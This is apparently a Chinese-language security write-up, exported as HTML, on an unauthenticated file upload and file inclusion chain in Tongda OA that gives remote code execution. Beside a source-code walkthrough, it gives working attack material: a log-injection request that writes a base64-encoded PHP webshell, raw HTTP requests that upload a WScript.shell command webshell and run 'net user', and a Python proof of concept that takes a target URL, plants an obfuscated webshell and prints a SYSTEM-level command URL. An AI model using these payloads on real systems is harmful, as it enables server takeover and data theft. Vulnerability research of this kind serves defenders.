<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="通达oa-任意文件上传rce文件包含"><span class="csECDA2D3">通达</span><span class="csDE05BCC">oa </span><span class="csECDA2D3">任意文件上传</span><span class="csDE05BCC">+rce+</span><span class="csECDA2D3">文件包含</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">有些版本</span><span class="cs8926E06">gateway.php</span><span class="cs9C1B1871">路径不同</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">例如</span><span class="cs8926E06">2013</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/ispirit/im/upload.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http://www.0-sec.org/ispirit/interface/gateway.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">例如</span><span class="cs8926E06">2017</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/ispirit/im/upload.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http://www.0-sec.org/mac/gateway.php</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">C:\MYOA&gt;dir /s /b gateway.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">C:\MYOA\webroot\mac\gateway.php</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2015</span><span class="cs9C1B1871">没有文件包含，官方给的补丁</span><span class="cs8926E06">2017</span><span class="cs9C1B1871">的没有修复文件包含，所以还有很多种包含日志文件</span><span class="cs8926E06">getshell</span><span class="cs9C1B1871">的姿势，不一定要文件上传。</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/api/ddsuite/error.php</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">POST:message=&lt;?php file_put_contents(&quot;2.php&quot;,base64_decode(&quot;PD9waHAgYXNzZXJ0KCRfUE9TVFsxXSk7Pz4=&quot;));?&gt;52011 </span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">然后包含</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">http://www.0-sec.org/mac/gateway.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">POST:json={&quot;url&quot;:&quot;..\/..\/logs\/oa\/2003\/dd_error.log&quot;}</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">在</span><span class="cs9FB05234">http://192.168.124.138/mac/2.php</span><span class="cs7FFD2630">就是</span><span class="cs9FB05234">shell</span><span class="cs7FFD2630">密码</span><span class="cs9FB05234">1</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">V11</span><span class="cs9C1B1871">版</span><span class="cs8926E06"><br/>2017</span><span class="cs9C1B1871">版</span><span class="cs8926E06"><br/>2016</span><span class="cs9C1B1871">版</span><span class="cs8926E06"><br/>2015</span><span class="cs9C1B1871">版</span><span class="cs8926E06"><br/>2013</span><span class="cs9C1B1871">增强版</span><span class="cs8926E06"><br/>2013</span><span class="cs9C1B1871">版</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我们根据官网发布的补丁，更新的是</span><span class="cs8926E06">ispirit/im/upload.php</span><span class="cs9C1B1871">这个文件，我们跟进这个文件</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image0.png" width="560" height="343" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当传入</span><span class="cs8926E06">P</span><span class="cs9C1B1871">参数时，就可以绕过登录认证，直接获取到</span><span class="cs8926E06">session</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image1.png" width="560" height="361" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进函数流程，逻辑判断是否传入</span><span class="cs8926E06">DEST_UID</span><span class="cs9C1B1871">并且不为</span><span class="cs8926E06">0</span><span class="cs9C1B1871">，否则直接退出。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image2.png" width="560" height="292" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">传入一个</span><span class="cs8926E06">DEST_UID</span><span class="cs9C1B1871">后，访问，提示无文件上传</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image3.png" width="560" height="374" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">1&lt;=count($_FILES)</span><span class="cs9C1B1871">判断是否有文件上传，后面的逻辑，如果传入文件，直接进入未授权任意文件上传</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image4.png" width="560" height="375" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以使用</span><span class="cs8926E06">python3</span><span class="cs9C1B1871">的</span><span class="cs8926E06">requests</span><span class="cs9C1B1871">库进行文件上传操作，跟进代码，后面判断的是</span><span class="cs8926E06">UPLOAD_MODE</span><span class="cs9C1B1871">上传模式的值，如果传入</span><span class="cs8926E06">UPLOAD_MODE</span><span class="cs9C1B1871">，当取值为</span><span class="cs8926E06">1</span><span class="cs9C1B1871">，</span><span class="cs8926E06">2</span><span class="cs9C1B1871">，</span><span class="cs8926E06">3</span><span class="cs9C1B1871">时，将回显。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image5.png" width="560" height="194" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image6.png" width="560" height="348" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">进入上传逻辑，调用</span><span class="cs8926E06">upload()</span><span class="cs9C1B1871">函数，</span><span class="cs8926E06">upload()</span><span class="cs9C1B1871">会对上传的文件进行后缀名检测，这里使用</span><span class="cs8926E06">name.php.</span><span class="cs9C1B1871">即可绕过文件后缀名限制，调用</span><span class="cs8926E06">upload</span><span class="cs9C1B1871">函数后，会返回一个</span><span class="cs8926E06">$ATTACHMENTS</span><span class="cs9C1B1871">数组，这也是后面我们传入上传模式</span><span class="cs8926E06">UPLOAD_MODE</span><span class="cs9C1B1871">值时会根据该值的取值返回</span><span class="cs8926E06">$ATTACHMENTS[ID]</span><span class="cs9C1B1871">和</span><span class="cs8926E06">$ATTACHMENTS[NAME]</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image7.png" width="560" height="261" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06">upload()</span><span class="cs9C1B1871">函数，</span><span class="cs8926E06">$ATTACHMENTS[ID]</span><span class="cs9C1B1871">由</span><span class="cs8926E06">add_attach()</span><span class="cs9C1B1871">函数返回</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">在</span><span class="cs8926E06">add_attach()</span><span class="cs9C1B1871">可以看到传入的文件存储路径为</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image8.png" width="560" height="102" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">$MODULE</span><span class="cs9C1B1871">的值在</span><span class="cs8926E06">upload.php</span><span class="cs9C1B1871">文件中指定为</span><span class="cs8926E06">im</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image9.png" width="560" height="473" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">存储路径就保存在在</span><span class="cs8926E06">upload.php</span><span class="cs9C1B1871">文件中指定的</span><span class="cs8926E06">attch/im/$YM/</span><span class="cs9C1B1871">文件夹下面，文件名就是</span><span class="cs8926E06">$ATTACH_ID.$ATTACH_FILE<br/>add_attach()</span><span class="cs9C1B1871">函数最终返回的前台的能够回显的</span><span class="cs8926E06">$ATTACHMENTS[ID]</span><span class="cs9C1B1871">里面就包含上传的文件名和路径。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image10.png" width="560" height="241" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时，我们就可以构造</span><span class="cs8926E06">payloads</span><span class="cs9C1B1871">进行任意文件上传</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image11.png" width="560" height="155" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是，开发者指定的保存路径不在</span><span class="cs8926E06">wwwroot</span><span class="cs9C1B1871">目录下面，我们只能通过文件包含漏洞进行包含触发漏洞。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">文件包含漏洞出现在</span><span class="cs8926E06">/ispirit/interface/gateway.php</span><span class="cs9C1B1871">，首先接从客户端接收一个</span><span class="cs8926E06">$json</span><span class="cs9C1B1871">的参数，然后将</span><span class="cs8926E06">$json</span><span class="cs9C1B1871">转换为数组后再转换成变量，当存在</span><span class="cs8926E06">$json</span><span class="cs9C1B1871">数据中存在一个</span><span class="cs8926E06">key</span><span class="cs9C1B1871">为</span><span class="cs8926E06">url</span><span class="cs9C1B1871">的且不为空的值时，并且</span><span class="cs8926E06">url</span><span class="cs9C1B1871">传入的数据中有</span><span class="cs8926E06">general/</span><span class="cs9C1B1871">或者</span><span class="cs8926E06">ispirit/</span><span class="cs9C1B1871">或者</span><span class="cs8926E06">module/</span><span class="cs9C1B1871">时，执行</span><span class="cs8926E06">include_once</span><span class="cs9C1B1871">包含该</span><span class="cs8926E06">url</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image12.png" width="560" height="313" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此处文件包含的另外一个利用，直接触发</span><span class="cs8926E06">nginx</span><span class="cs9C1B1871">的错误日志，利用文件包含直接</span><span class="cs8926E06">getshell</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0+rce+%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_files/image13.png" width="560" height="284" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="请求包"><span class="csD6CA00D2">请求包</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">POST /ispirit/im/upload.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 10.10.20.116:88</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 658</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: no-cache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=123</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;P&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">123</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;DEST_UID&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: image/jpeg</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$command=$_POST[&#39;cmd&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$wsh = new COM(&#39;WScript.shell&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$stdout = $exec-&gt;StdOut();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$stroutput = $stdout-&gt;ReadAll();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo $stroutput;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /mac/gateway.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 10.10.20.116:88</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: keep-alive</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: python-requests/2.21.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 71</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">json={&quot;url&quot;:&quot;/general/../../attach/im/2003/938379153.jpg&quot;}&amp;cmd=net user</span></p><h3 class="cs868C439D">
			<a name="poc-上传文件包含rce"><span class="csD1E291E2">poc </span><span class="csD6CA00D2">（上传</span><span class="csD1E291E2">+</span><span class="csD6CA00D2">文件包含</span><span class="csD1E291E2">+rce</span><span class="csD6CA00D2">）</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">import os</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">定义</span><span class="cs9FB05234">webshell</span><span class="cs7FFD2630">，因为是包含，所以用写入马比较方便</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">这个马自带</span><span class="cs9FB05234">bypass disable_function </span><span class="cs7FFD2630">功能</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shell = &#39;&#39;&#39;&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$fp = fopen(&#39;readme.php&#39;, &#39;w+&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$a = base64_decode(&quot;JTNDJTNGcGhwJTBBJTI0Y29tbWFuZCUzRCUyNF9HRVQlNWIlMjdhJTI3JTVkJTNCJTBBJTI0d3NoJTIwJTNEJTIwbmV3JTIwQ09NJTI4JTI3V1NjcmlwdC5zaGVsbCUyNyUyOSUzQiUwQSUyNGV4ZWMlMjAlM0QlMjAlMjR3c2gtJTNFZXhlYyUyOCUyMmNtZCUyMC9jJTIwJTIyLiUyNGNvbW1hbmQlMjklM0IlMEElMjRzdGRvdXQlMjAlM0QlMjAlMjRleGVjLSUzRVN0ZE91dCUyOCUyOSUzQiUwQSUyNHN0cm91dHB1dCUyMCUzRCUyMCUyNHN0ZG91dC0lM0VSZWFkQWxsJTI4JTI5JTNCJTBBZWNobyUyMCUyNHN0cm91dHB1dCUzQiUwQSUzRiUzRQ==&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fwrite($fp, urldecode($a));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fclose($fp);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;&#39;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">输入目标</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url = input(&quot;input the TARGET(example:[url]https://127.0.0.1:1080[/url])&gt;&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">定义上传目录和包含目录</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">upload_url = url+&quot;/ispirit/im/upload.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">include_url = url+&quot;/ispirit/interface/gateway.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">定义</span><span class="cs9FB05234">shell</span><span class="cs7FFD2630">目录，如果要修改名字，需要把</span><span class="cs9FB05234">shell</span><span class="cs7FFD2630">里面的一起改了</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shell_url = url+&quot;/ispirit/interface/readme.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">files = {&#39;ATTACHMENT&#39;: shell}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">参见源码，有漏洞的版本只要</span><span class="cs9FB05234">POST P</span><span class="cs7FFD2630">和</span><span class="cs9FB05234">DEST_UID</span><span class="cs7FFD2630">参数就会自动生成</span><span class="cs9FB05234">session</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">upload_data = {&quot;P&quot;: &quot;123&quot;, &quot;DEST_UID&quot;: &quot;1&quot;, &quot;UPLOAD_MODE&quot;: &quot;2&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">上传</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">upload_res = requests.post(upload_url, upload_data, files=files)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">此时会返回上传文件的路径</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">path = upload_res.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">解析返回值获取上传地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">path = path[path.find(&#39;@&#39;)+1:path.rfind(&#39;|&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;].replace(&quot;_&quot;, &quot;\/&quot;).replace(&quot;|&quot;, &quot;.&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">由于上传文件会自动改为</span><span class="cs9FB05234">jpg</span><span class="cs7FFD2630">，所以要用</span><span class="cs9FB05234">gateway.php</span><span class="cs7FFD2630">包含</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">include_data = {&quot;json&quot;: &quot;{\&quot;url\&quot;:\&quot;/general/../../attach/im/&quot; + path+&quot;\&quot;}&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">包含</span><span class="cs9FB05234">+</span><span class="cs7FFD2630">自动写入</span><span class="cs9FB05234">shell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">include_res = requests.post(include_url, data=include_data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">返回结果</span><span class="cs9FB05234"> a</span><span class="cs7FFD2630">参数可以直接填入系统命令（比如</span><span class="cs9FB05234">whoami</span><span class="cs7FFD2630">），默认是</span><span class="cs9FB05234">system</span><span class="cs7FFD2630">权限</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&#39;shell is here:&#39;+shell_url+&#39;?a=command&#39;)</span></p></body>
</html>
